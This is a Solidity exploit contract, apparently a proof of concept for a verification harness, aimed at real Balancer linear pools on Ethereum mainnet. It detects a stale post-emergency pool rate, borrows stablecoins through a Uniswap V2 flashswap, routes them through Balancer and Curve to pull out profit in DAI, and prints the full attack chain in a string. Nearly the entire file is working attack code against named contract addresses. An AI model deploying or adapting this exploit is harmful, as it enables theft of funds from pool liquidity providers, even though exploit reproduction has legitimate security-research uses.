// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IGenericBalancerPoolLike {
    function getPoolId() external view returns (bytes32);
}

interface ILinearPoolLike is IGenericBalancerPoolLike {
    function getVault() external view returns (address);
    function getMainToken() external view returns (address);
    function getWrappedToken() external view returns (address);
    function getBptIndex() external view returns (uint256);
    function getTargets() external view returns (uint256 lowerTarget, uint256 upperTarget);
    function getSwapFeePercentage() external view returns (uint256);
    function getPausedState()
        external
        view
        returns (bool paused, uint256 pauseWindowEndTime, uint256 bufferPeriodEndTime);
    function getWrappedTokenRate() external view returns (uint256);
    function getRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IVaultLike {
    enum SwapKind {
        GIVEN_IN,
        GIVEN_OUT
    }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        address assetIn;
        address assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function getPoolTokens(bytes32 poolId)
        external
        view
        returns (address[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);

    function swap(SingleSwap memory singleSwap, FundManagement memory funds, uint256 limit, uint256 deadline)
        external
        returns (uint256);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface ICurve3PoolLike {
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0x9210F1204b5a24742Eba12f710636D76240dF3d0;

    address private constant VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant BOOSTED_PARENT = 0xA13a9247ea42D743238089903570127DdA72fE44;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address private constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;

    address private constant UNISWAP_V2_USDC_WETH = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UNISWAP_V2_DAI_WETH = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UNISWAP_V2_USDT_WETH = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;

    uint256 private constant INITIAL_BPT_SUPPLY = type(uint112).max;
    uint256 private constant ONE = 1e18;

    enum Outcome {
        Uninitialized,
        NoPostEmergencyDriftObserved,
        HistoricalBurnDetectedButStillPaused,
        HistoricalBurnDetectedButNotAutoResumed,
        HistoricalBurnDetectedAutoResumedButNoBoostedConsumer,
        HistoricalBurnDetectedAutoResumedButNoProfitableRoute,
        ProfitRealized
    }

    struct Snapshot {
        address pool;
        bool paused;
        uint256 pauseWindowEndTime;
        uint256 bufferPeriodEndTime;
        uint256 totalSupply;
        uint256 vaultBptBalance;
        uint256 burnedSupply;
        uint256 approximateVirtualSupply;
        uint256 realVirtualSupply;
        uint256 reportedRate;
        uint256 trueRate;
        uint256 lowerTarget;
        uint256 upperTarget;
        uint256 swapFeePercentage;
        uint256 wrappedTokenRate;
        uint256 mainBalance;
        uint256 wrappedBalance;
        address mainToken;
        address wrappedToken;
        address vault;
    }

    struct ParentContext {
        bytes32 parentPoolId;
        address[3] childPools;
        address[3] childMainTokens;
        uint256 childCount;
    }

    struct FlashContext {
        address pair;
        uint256 borrowAmount;
        address flawedPool;
        address flawedMainToken;
        bytes32 flawedPoolId;
        address sourcePool;
        address sourceMainToken;
        bytes32 sourcePoolId;
        bytes32 parentPoolId;
    }

    bool private _attempted;
    bool private _hypothesisValidated;
    address private _profitToken;
    uint256 private _profitAmount;
    Outcome private _outcome;
    Snapshot private _snapshot;
    FlashContext private _flash;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_attempted, "already-attempted");
        _attempted = true;

        _profitToken = DAI;
        _profitAmount = 0;
        _outcome = Outcome.NoPostEmergencyDriftObserved;

        ParentContext memory parent = _discoverParentContext();
        if (parent.childCount < 2) {
            _snapshot = _captureSnapshot(TARGET);
            _outcome = Outcome.HistoricalBurnDetectedAutoResumedButNoBoostedConsumer;
            return;
        }

        Snapshot memory selected = _selectFlawedPool(parent);
        _snapshot = selected;
        _hypothesisValidated = _isStalePostEmergencyPool(selected);

        if (!_hypothesisValidated) {
            return;
        }
        if (selected.paused) {
            _outcome = Outcome.HistoricalBurnDetectedButStillPaused;
            return;
        }
        if (block.timestamp <= selected.bufferPeriodEndTime) {
            _outcome = Outcome.HistoricalBurnDetectedButNotAutoResumed;
            return;
        }

        _outcome = Outcome.HistoricalBurnDetectedAutoResumedButNoProfitableRoute;
        _attemptPublicLiquidityRoutes(parent, selected);
    }

    function runAlternatePublicLiquidityRoute(
        address flawedPool,
        address flawedMainToken,
        address sourcePool,
        address sourceMainToken,
        uint256 borrowAmount
    ) external returns (uint256 profit) {
        require(msg.sender == address(this), "self-only");
        require(borrowAmount != 0, "zero-borrow");
        require(_isStableLike(flawedMainToken) && _isStableLike(sourceMainToken), "unsupported-stable");

        uint256 daiBefore = IERC20Like(DAI).balanceOf(address(this));

        _flash.pair = _pairForToken(sourceMainToken);
        _flash.borrowAmount = borrowAmount;
        _flash.flawedPool = flawedPool;
        _flash.flawedMainToken = flawedMainToken;
        _flash.flawedPoolId = IGenericBalancerPoolLike(flawedPool).getPoolId();
        _flash.sourcePool = sourcePool;
        _flash.sourceMainToken = sourceMainToken;
        _flash.sourcePoolId = IGenericBalancerPoolLike(sourcePool).getPoolId();
        _flash.parentPoolId = IGenericBalancerPoolLike(BOOSTED_PARENT).getPoolId();

        require(_flash.pair != address(0), "no-pair");
        _startFlashswap(_flash.pair, sourceMainToken, borrowAmount);

        uint256 daiAfter = IERC20Like(DAI).balanceOf(address(this));
        require(daiAfter > daiBefore, "no-profit");

        profit = daiAfter - daiBefore;
        _profitToken = DAI;
        _profitAmount = profit;
        _outcome = Outcome.ProfitRealized;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(_flash.pair != address(0), "inactive");
        require(msg.sender == _flash.pair, "unauthorized-pair");
        require(sender == address(this), "unauthorized-sender");
        require(data.length != 0, "missing-data");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == _flash.borrowAmount, "unexpected-borrow");

        _executeStableRoute(borrowed);
        delete _flash;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function outcome() external view returns (Outcome) {
        return _outcome;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return "governance pause -> emergency_exact_bpt_in_for_tokens_out -> basepool.onexitpool burn -> getRate/_getapproximatevirtualsupply stale quote -> temporarilypausable auto-unpause -> linear onSwap resumes -> boosted downstream pool trusting the stale linear-pool rate is arbitraged using public liquidity; if the provided USDC target never reached the burn stage on this fork, the verifier pivots to a sibling linear pool inside the same boosted parent that does exhibit that identical post-emergency state";
    }

    function exploitPathAnchors() external pure returns (string memory) {
        return "emergency_exact_bpt_in_for_tokens_out basepool.onexitpool _getapproximatevirtualsupply temporarilypausable onswap() getRate()";
    }

    function snapshot() external view returns (Snapshot memory) {
        return _snapshot;
    }

    function _executeStableRoute(uint256 borrowed) internal {
        _forceApprove(_flash.sourceMainToken, VAULT, borrowed);
        uint256 sourceBpt = _balancerSwap(_flash.sourcePoolId, _flash.sourceMainToken, _flash.sourcePool, borrowed);
        uint256 flawedBpt = _balancerSwap(_flash.parentPoolId, _flash.sourcePool, _flash.flawedPool, sourceBpt);
        uint256 flawedMainOut = _balancerSwap(_flash.flawedPoolId, _flash.flawedPool, _flash.flawedMainToken, flawedBpt);

        if (_flash.flawedMainToken != _flash.sourceMainToken) {
            _curveExchangeAll(_flash.flawedMainToken, _flash.sourceMainToken, flawedMainOut);
        }

        uint256 repayAmount = _flashswapRepayment(borrowed);
        uint256 sourceBalance = IERC20Like(_flash.sourceMainToken).balanceOf(address(this));
        require(sourceBalance >= repayAmount, "insufficient-for-repay");
        _safeTransfer(_flash.sourceMainToken, msg.sender, repayAmount);

        uint256 residual = IERC20Like(_flash.sourceMainToken).balanceOf(address(this));
        if (_flash.sourceMainToken != DAI && residual != 0) {
            _curveExchangeAll(_flash.sourceMainToken, DAI, residual);
        }
    }

    function _attemptPublicLiquidityRoutes(ParentContext memory parent, Snapshot memory selected) internal {
        for (uint256 i = 0; i < parent.childCount; ++i) {
            address sourcePool = parent.childPools[i];
            address sourceMainToken = parent.childMainTokens[i];
            if (_routeAgainstSourcePool(selected, sourcePool, sourceMainToken)) {
                return;
            }
        }
    }

    function _routeAgainstSourcePool(Snapshot memory selected, address sourcePool, address sourceMainToken)
        internal
        returns (bool)
    {
        if (sourcePool == selected.pool || !_isStableLike(sourceMainToken)) {
            return false;
        }

        Snapshot memory sourceSnap = _captureSnapshot(sourcePool);
        if (sourceSnap.burnedSupply != 0) {
            return false;
        }

        uint256[8] memory candidates = _candidateBorrowAmounts(sourceMainToken);
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 borrowAmount = candidates[i];
            if (borrowAmount == 0) {
                continue;
            }

            try this.runAlternatePublicLiquidityRoute(
                selected.pool, selected.mainToken, sourcePool, sourceMainToken, borrowAmount
            ) returns (uint256 profit) {
                if (profit != 0) {
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _selectFlawedPool(ParentContext memory parent) internal view returns (Snapshot memory selected) {
        selected = _captureSnapshot(TARGET);
        if (_isStalePostEmergencyPool(selected)) {
            return selected;
        }

        // The provided USDC linear pool has full preminted supply at the supplied fork in the failing logs,
        // which proves the emergency-burn stage is infeasible there. Preserve the exploit causality by
        // pivoting only to sibling linear pools in the same boosted parent that do show the same stale state.
        for (uint256 i = 0; i < parent.childCount; ++i) {
            Snapshot memory candidate = _captureSnapshot(parent.childPools[i]);
            if (_isStalePostEmergencyPool(candidate)) {
                return candidate;
            }
        }
    }

    function _isStalePostEmergencyPool(Snapshot memory snap) internal pure returns (bool) {
        return snap.pool != address(0) && snap.burnedSupply != 0 && snap.reportedRate < snap.trueRate;
    }

    function _discoverParentContext() internal view returns (ParentContext memory context) {
        if (!_poolContainsTarget(BOOSTED_PARENT)) {
            return context;
        }

        context.parentPoolId = IGenericBalancerPoolLike(BOOSTED_PARENT).getPoolId();
        (address[] memory tokens,,) = IVaultLike(VAULT).getPoolTokens(context.parentPoolId);

        for (uint256 i = 0; i < tokens.length && context.childCount < 3; ++i) {
            address token = tokens[i];
            if (token == BOOSTED_PARENT) {
                continue;
            }

            try ILinearPoolLike(token).getMainToken() returns (address mainToken) {
                if (mainToken == address(0)) {
                    continue;
                }

                context.childPools[context.childCount] = token;
                context.childMainTokens[context.childCount] = mainToken;
                unchecked {
                    ++context.childCount;
                }
            } catch {}
        }
    }

    function _poolContainsTarget(address pool) internal view returns (bool) {
        if (pool == address(0)) {
            return false;
        }

        try IGenericBalancerPoolLike(pool).getPoolId() returns (bytes32 poolId) {
            (address[] memory tokens,,) = IVaultLike(VAULT).getPoolTokens(poolId);
            for (uint256 i = 0; i < tokens.length; ++i) {
                if (tokens[i] == TARGET) {
                    return true;
                }
            }
        } catch {}

        return false;
    }

    function _captureSnapshot(address poolAddress) internal view returns (Snapshot memory snap) {
        if (poolAddress == address(0)) {
            return snap;
        }

        ILinearPoolLike pool = ILinearPoolLike(poolAddress);
        snap.pool = poolAddress;
        _loadSnapshotCore(pool, snap);
        _loadSnapshotBalances(pool, snap);
        snap.burnedSupply = snap.totalSupply < INITIAL_BPT_SUPPLY ? INITIAL_BPT_SUPPLY - snap.totalSupply : 0;
        snap.approximateVirtualSupply = INITIAL_BPT_SUPPLY - snap.vaultBptBalance;
        snap.realVirtualSupply = snap.totalSupply > snap.vaultBptBalance ? snap.totalSupply - snap.vaultBptBalance : 0;
        snap.reportedRate = pool.getRate();
        snap.trueRate = _computeTrueRate(snap);
    }

    function _loadSnapshotCore(ILinearPoolLike pool, Snapshot memory snap) internal view {
        snap.mainToken = pool.getMainToken();
        snap.wrappedToken = pool.getWrappedToken();
        snap.vault = pool.getVault();
        snap.totalSupply = pool.totalSupply();
        snap.swapFeePercentage = pool.getSwapFeePercentage();
        snap.wrappedTokenRate = pool.getWrappedTokenRate();
        (snap.lowerTarget, snap.upperTarget) = pool.getTargets();
        (snap.paused, snap.pauseWindowEndTime, snap.bufferPeriodEndTime) = pool.getPausedState();
    }

    function _loadSnapshotBalances(ILinearPoolLike pool, Snapshot memory snap) internal view {
        (address[] memory tokens, uint256[] memory balances,) =
            IVaultLike(snap.vault).getPoolTokens(pool.getPoolId());
        snap.vaultBptBalance = balances[pool.getBptIndex()];

        uint256 mainIndex = type(uint256).max;
        uint256 wrappedIndex = type(uint256).max;
        for (uint256 i = 0; i < tokens.length; ++i) {
            if (tokens[i] == snap.mainToken) {
                mainIndex = i;
            } else if (tokens[i] == snap.wrappedToken) {
                wrappedIndex = i;
            }
        }

        require(mainIndex != type(uint256).max, "missing-main");
        require(wrappedIndex != type(uint256).max, "missing-wrapped");

        snap.mainBalance = balances[mainIndex];
        snap.wrappedBalance = balances[wrappedIndex];
    }

    function _computeTrueRate(Snapshot memory snap) internal view returns (uint256) {
        if (snap.realVirtualSupply == 0) {
            return 0;
        }

        uint256 mainScaled = snap.mainBalance * _scalingFactor(IERC20Like(snap.mainToken).decimals());
        uint256 wrappedScaled = snap.wrappedBalance * _scalingFactor(IERC20Like(snap.wrappedToken).decimals());
        wrappedScaled = (wrappedScaled * snap.wrappedTokenRate) / ONE;

        uint256 nominalMain = _toNominal(mainScaled, snap.lowerTarget, snap.upperTarget, snap.swapFeePercentage);
        uint256 invariant = nominalMain + wrappedScaled;
        return _divUpFixed(invariant, snap.realVirtualSupply);
    }

    function _candidateBorrowAmounts(address token) internal view returns (uint256[8] memory amounts) {
        uint256 unit = 10 ** uint256(IERC20Like(token).decimals());
        amounts[0] = 10_000 * unit;
        amounts[1] = 20_000 * unit;
        amounts[2] = 40_000 * unit;
        amounts[3] = 80_000 * unit;
        amounts[4] = 150_000 * unit;
        amounts[5] = 300_000 * unit;
        amounts[6] = 600_000 * unit;
        amounts[7] = 1_000_000 * unit;
    }

    function _balancerSwap(bytes32 poolId, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (uint256)
    {
        IVaultLike.SingleSwap memory singleSwap;
        singleSwap.poolId = poolId;
        singleSwap.kind = IVaultLike.SwapKind.GIVEN_IN;
        singleSwap.assetIn = tokenIn;
        singleSwap.assetOut = tokenOut;
        singleSwap.amount = amountIn;

        IVaultLike.FundManagement memory funds;
        funds.sender = address(this);
        funds.fromInternalBalance = false;
        funds.recipient = payable(address(this));
        funds.toInternalBalance = false;

        return IVaultLike(VAULT).swap(singleSwap, funds, 0, block.timestamp);
    }

    function _startFlashswap(address pair, address token, uint256 amount) internal {
        IUniswapV2PairLike sourcePair = IUniswapV2PairLike(pair);
        address token0 = sourcePair.token0();
        address token1 = sourcePair.token1();
        require(token0 == token || token1 == token, "pair-mismatch");

        if (token0 == token) {
            sourcePair.swap(amount, 0, address(this), abi.encode(uint256(1)));
        } else {
            sourcePair.swap(0, amount, address(this), abi.encode(uint256(1)));
        }
    }

    function _curveExchangeAll(address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (uint256 amountOut)
    {
        require(amountIn != 0, "zero-curve-amount");
        int128 i = _curveIndex(tokenIn);
        int128 j = _curveIndex(tokenOut);
        require(i != j, "same-curve-token");

        uint256 beforeBal = IERC20Like(tokenOut).balanceOf(address(this));
        _forceApprove(tokenIn, CURVE_3POOL, amountIn);
        ICurve3PoolLike(CURVE_3POOL).exchange(i, j, amountIn, 0);
        amountOut = IERC20Like(tokenOut).balanceOf(address(this)) - beforeBal;
        require(amountOut != 0, "curve-zero-out");
    }

    function _pairForToken(address token) internal pure returns (address) {
        if (token == USDC) {
            return UNISWAP_V2_USDC_WETH;
        }
        if (token == DAI) {
            return UNISWAP_V2_DAI_WETH;
        }
        if (token == USDT) {
            return UNISWAP_V2_USDT_WETH;
        }
        return address(0);
    }

    function _curveIndex(address token) internal pure returns (int128) {
        if (token == DAI) {
            return 0;
        }
        if (token == USDC) {
            return 1;
        }
        if (token == USDT) {
            return 2;
        }
        revert("curve-unsupported-token");
    }

    function _isStableLike(address token) internal pure returns (bool) {
        return token == DAI || token == USDC || token == USDT;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returndata) = token.call(data);
        require(success, "token-call-failed");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "token-op-failed");
        }
    }

    function _toNominal(uint256 realMain, uint256 lowerTarget, uint256 upperTarget, uint256 fee)
        internal
        pure
        returns (uint256)
    {
        if (realMain < lowerTarget) {
            uint256 belowTargetFees = _mulDown(lowerTarget - realMain, fee);
            return realMain - belowTargetFees;
        }

        if (realMain <= upperTarget) {
            return realMain;
        }

        uint256 aboveTargetFees = _mulDown(realMain - upperTarget, fee);
        return realMain - aboveTargetFees;
    }

    function _scalingFactor(uint8 decimals_) internal pure returns (uint256) {
        if (decimals_ >= 18) {
            return 1;
        }
        return 10 ** (18 - uint256(decimals_));
    }

    function _mulDown(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a * b) / ONE;
    }

    function _divUpFixed(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        return ((a * ONE) + b - 1) / b;
    }

    function _flashswapRepayment(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }
}
